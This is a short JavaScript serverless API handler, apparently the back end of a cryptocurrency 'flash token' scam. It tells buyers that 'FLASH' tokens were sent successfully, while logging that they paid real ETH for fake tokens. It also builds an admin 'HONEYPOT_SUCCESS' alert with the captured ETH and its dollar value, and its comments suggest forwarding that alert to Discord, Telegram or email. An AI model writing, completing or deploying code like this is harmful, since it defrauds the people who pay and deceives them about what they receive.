export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { userAddress, tokenAmount, realEthPaid, txHash } = req.body;

  try {
    // Log the fake token "transaction"
    console.log('FAKE TOKEN SENT:', {
      to: userAddress,
      amount: tokenAmount + ' FLASH',
      realEthReceived: realEthPaid + ' ETH',
      txHash: txHash,
      timestamp: new Date().toISOString()
    });

    // Alert admin about successful honeypot
    const adminAlert = {
      type: 'HONEYPOT_SUCCESS',
      userAddress: userAddress,
      realEthCaptured: realEthPaid + ' ETH',
      fakeTokensSent: tokenAmount + ' FLASH',
      txHash: txHash,
      usdValue: (parseFloat(realEthPaid) * 3200).toFixed(2),
      timestamp: new Date().toISOString(),
      note: 'User paid real ETH, received fake tokens'
    };

    // You can send this to Discord, Telegram, or email
    console.log('🎯 HONEYPOT ALERT:', adminAlert);

    res.status(200).json({
      success: true,
      message: 'Fake tokens sent successfully',
      tokenAmount: tokenAmount,
      tokenSymbol: 'FLASH'
    });

  } catch (error) {
    console.error('Error sending fake tokens:', error);
    res.status(500).json({ error: 'Failed to send tokens' });
  }
}